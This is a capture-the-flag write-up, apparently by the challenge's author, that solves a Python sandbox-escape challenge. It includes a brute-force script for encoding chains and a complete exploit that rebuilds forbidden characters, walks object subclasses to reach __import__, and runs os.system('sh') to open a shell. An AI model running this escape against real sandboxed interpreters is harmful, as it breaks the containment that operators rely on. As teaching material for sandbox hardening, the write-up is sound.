# Solution

I made this challenge by testing different restrictions. Unless someone found a better way to do this, we discovered in step 1 that we could:

- Extract strings that we needed from exceptions, we used that to obtain the `"_"` string;
- Call far-fetched functions as long as they are reachable in format string by leveraging the obtained `"_"` string and the `obj` attribute of an `AttributeError`.

However, we needed to use the string `"{"` in order to craft our format string. So while making this challenge, I was wondering if it was possible to obtain this string without quote or curly bracket. I started by grepping in the cpython source for exception containing the `'{'` character, but I found none. While looking at `help(str)`, I wondered if it was possible to chain calls to `str.encode` and `bytes.decode` in order to produces characters that would be otherwise rejected by the sandbox. Fortunately, I have a collegue (cheers @remsio) who’s addicted to PHP, and showed me PHP filter chains, of which you can find an article of his here: [https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it).

So I asked ChatGPT to make a script for bruteforcing the encoding, and it produced this:

```python
import codecs
from itertools import product

# These characters are easy to obtain with NameError.name
allowed_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
# Some of the encodings found at
#   https://docs.python.org/3.12/library/codecs.html#standard-encodings
encodings = [
    'ascii', 'utf_8', 'utf_16', 'utf_32', 'latin_1', 'cp037', 'cp500',
    'cp875', 'cp1026', 'cp1252', 'cp1140', 'utf_16_be', 'utf_16_le', 'utf_32_be', 'utf_32_le',
]

def try_sequence(initial_string, encoding_sequence):
    try:
        value = initial_string
        for encoding, action in encoding_sequence:
            if action == 'encode':
                value = value.encode(encoding)
            elif action == 'decode':
                value = value.decode(encoding)
            else:
                return None
        return value
    except Exception:
        return None

def brute_force_find_target(target_char, max_steps=4):
    for initial_string in allowed_chars:
        for step_count in range(1, max_steps + 1):
            for actions in product(['encode', 'decode'], repeat=step_count):
                for encoding_sequence in product(encodings, repeat=step_count):
                    sequence = list(zip(encoding_sequence, actions))
                    result = try_sequence(initial_string, sequence)
                    if isinstance(result, str) and target_char in result:
                        return initial_string, sequence, result

    return None, None, None

target = '{'
initial, sequence, final_result = brute_force_find_target(target)

if initial:
    print(f"Initial string: {repr(initial)}")
    print("Encoding/decoding sequence:")
    for enc, action in sequence:
        print(f"  {action} -> {enc}")
    print(f"Final result: {repr(final_result)}")
else:
    print("No solution found")
```

Outputs for `target = '{'` and `target = '}'`:

```python
Initial string: 'd'
Encoding/decoding sequence:
  encode -> ascii
  decode -> cp037
  encode -> utf_16
  decode -> cp037
Final result: '\x9fÚ{\x00'

Initial string: 'c'
Encoding/decoding sequence:
  encode -> utf_16
  decode -> utf_16_be
  encode -> utf_8
  decode -> cp1026
Final result: 'Õ×´W}Ø'
```

We can then filter out the other character in the output of the encode/decode chain with the `str.isXXX` functions. To do this we must create a “signature” for the `{}` characters:

```python
isfunctions = [*filter(lambda x: x.startswith("is"), dir(str))]
print({c: {fn: getattr(c, fn)() for fn in isfunctions} for c in 'Õ×´W}Ø'})
```

Which produces:

```python
{'Õ': {'isalnum': True,
  'isalpha': True,
  'isascii': False,
  'isdecimal': False,
  'isdigit': False,
  'isidentifier': True,
  'islower': False,
  'isnumeric': False,
  'isprintable': True,
  'isspace': False,
  'istitle': True,
  'isupper': True},
 '×': {'isalnum': False,
  'isalpha': False,
  'isascii': False,
  'isdecimal': False,
  'isdigit': False,
  'isidentifier': False,
  'islower': False,
  'isnumeric': False,
  'isprintable': True,
  'isspace': False,
  'istitle': False,
  'isupper': False},
 '´': {'isalnum': False,
  'isalpha': False,
  'isascii': False,
  'isdecimal': False,
  'isdigit': False,
  'isidentifier': False,
  'islower': False,
  'isnumeric': False,
  'isprintable': True,
  'isspace': False,
  'istitle': False,
  'isupper': False},
 'W': {'isalnum': True,
  'isalpha': True,
  'isascii': True,
  'isdecimal': False,
  'isdigit': False,
  'isidentifier': True,
  'islower': False,
  'isnumeric': False,
  'isprintable': True,
  'isspace': False,
  'istitle': True,
  'isupper': True},
 '}': {'isalnum': False,
  'isalpha': False,
  'isascii': True,
  'isdecimal': False,
  'isdigit': False,
  'isidentifier': False,
  'islower': False,
  'isnumeric': False,
  'isprintable': True,
  'isspace': False,
  'istitle': False,
  'isupper': False},
 'Ø': {'isalnum': True,
  'isalpha': True,
  'isascii': False,
  'isdecimal': False,
  'isdigit': False,
  'isidentifier': True,
  'islower': False,
  'isnumeric': False,
  'isprintable': True,
  'isspace': False,
  'istitle': True,
  'isupper': True}}
```

We can now create a function `filtercurly` that returns a generator yielding only characters that match the signature of `}` that we can try outside of the sandbox:

```python
for filtercurly in exc(lambda x: (c for c in x if not c.isalnum() and not c.isalpha() and c.isascii() and not c.isdecimal() and not c.isdigit() and not c.isidentifier() and not c.islower() and not c.isnumeric() and c.isprintable() and not c.isspace() and not c.istitle() and not c.isupper())).args: pass
print([*filtercurly('\x9fÚ{\x00')]) # ['{']
```

### Final solution

```python
for filterdigit in exc(lambda x: (c for c in x if c.isdigit())).args: pass

for getgen in exc(lambda x: exc(x).args).args: pass

for filtercurly in exc(lambda x: (c for c in x if not c.isalnum() and not c.isalpha() and c.isascii() and not c.isdecimal() and not c.isdigit() and not c.isidentifier() and not c.islower() and not c.isnumeric() and c.isprintable() and not c.isspace() and not c.istitle() and not c.isupper())).args: pass

for filterdot in exc(lambda x: (c for c in x if c.isprintable() and c.isascii() and not (c.isalpha() or c.isdigit() or c.isalnum() or c.isspace() or c.islower() or c.isupper() or c.isidentifier() or c.isdecimal() or c.isnumeric()))).args: pass

try: import fakeimportforunderscore
except exc as excunderscore:
    for underscore in (c for c in excunderscore.msg if not (c.isalpha() or c.isspace())): pass

try: zero0
except exc as exczero0:
    for zero in filterdigit(exczero0.name): pass

try: one1
except exc as excone1:
    for one in filterdigit(excone1.name): pass

try: two2
except exc as exctwo2:
    for two in filterdigit(exctwo2.name): pass

try: three3
except exc as excthree3:
    for three in filterdigit(excthree3.name): pass

try: five5
except exc as excfive5:
    for five in filterdigit(excfive5.name): pass

try: six6
except exc as excsix6:
    for six in filterdigit(excsix6.name): pass

try: seven7
except exc as excseven7:
    for seven in filterdigit(excseven7.name): pass

try: eight8
except exc as exceight8:
    for eight in filterdigit(exceight8.name): pass

try: ascii
except exc as excascii:
    for ascii in getgen(excascii.name): pass

try: utf
except exc as excutf:
    for utf in getgen(excutf.name): pass

try: cp
except exc as exccp:
    for cp in getgen(exccp.name): pass

try: be
except exc as excbe:
    for be in getgen(excbe.name): pass

for utf16 in getgen(utf + underscore + one + six): pass

for utf16be in getgen(utf16 + underscore + be): pass

for utf8 in getgen(utf + eight): pass

for cp1026 in getgen(cp + one + zero + two + six): pass

for cp037 in getgen(cp + zero + three + seven): pass

for cp875 in getgen(cp + eight + seven + five): pass

try: d
except exc as excd:
    for d in getgen(excd.name): pass
for opencurly in filtercurly(d.encode(ascii).decode(cp037).encode(utf16).decode(cp037)): pass

try: c
except exc as excc:
    for c in getgen(excc.name): pass
for closecurly in filtercurly(c.encode(utf16).decode(utf16be).encode(utf8).decode(cp1026)): pass

try: h
except exc as exch:
    for h in getgen(exch.name): pass
for opensquare in h.encode(ascii).decode(cp1026): pass

try: a
except exc as exca:
    for a in getgen(exca.name): pass
for closesquare in filtercurly(a.encode(utf16).decode(cp875).encode(utf8).decode(cp037)): pass

try: lass
except exc as exclass:
    for clas in getgen(c + exclass.name): pass

try: base
except exc as excbase:
    for base in getgen(excbase.name): pass

try: subclasses
except exc as excsubclasses:
    for subclasses in getgen(excsubclasses.name): pass

try:
    async def fn():
        while aucuneimportance:
            yield aucuneimportancenonplus
    fn().asend()
except exc as excasync:
    for excasyncarg in excasync.args: pass

try: o
except exc as exco:
    for o in getgen(exco.name): pass

try: s
except exc as excs:
    for s in getgen(excs.name): pass

try: h
except exc as exch:
    for h in getgen(exch.name): pass

try:
    for dot in filterdot(excasyncarg):
        (opencurly + zero + dot + underscore + underscore + clas + underscore + underscore + dot + underscore + underscore + base + underscore + underscore + dot + underscore + underscore + subclasses + underscore + underscore + dot + d+d+d+d+d+d+d+d+d + closecurly).format(())
except exc as excsubclassesfn:
    for subclasses in getgen(excsubclassesfn.obj()): pass

try: builtins
except exc as excbuiltins:
    for builtins in getgen(excbuiltins.name): pass

try: init
except exc as excinit:
    for init in getgen(excinit.name): pass

try: imp
except exc as excimp:
    for imp in getgen(excimp.name): pass
try: ort
except exc as excort:
    for ort in getgen(excort.name): pass

for subclass in subclasses:
    try:
        (opencurly + zero + dot + underscore + underscore + init + underscore + underscore + dot + underscore + underscore + builtins + underscore + underscore + opensquare + underscore + underscore + imp+ort + underscore + underscore + closesquare + closecurly).format(subclass)
    except: continue

    try:
        (opencurly + zero + dot + underscore + underscore + init + underscore + underscore + dot + underscore + underscore + builtins + underscore + underscore + opensquare + underscore + underscore + imp+ort + underscore + underscore + closesquare + dot + d+d+d+d+d+d+d + closecurly).format(subclass)
    except exc as excfnimport:
        for fnimport in getgen(excfnimport.obj): pass
    fnimport(o+s).system(s+h)
    break
```
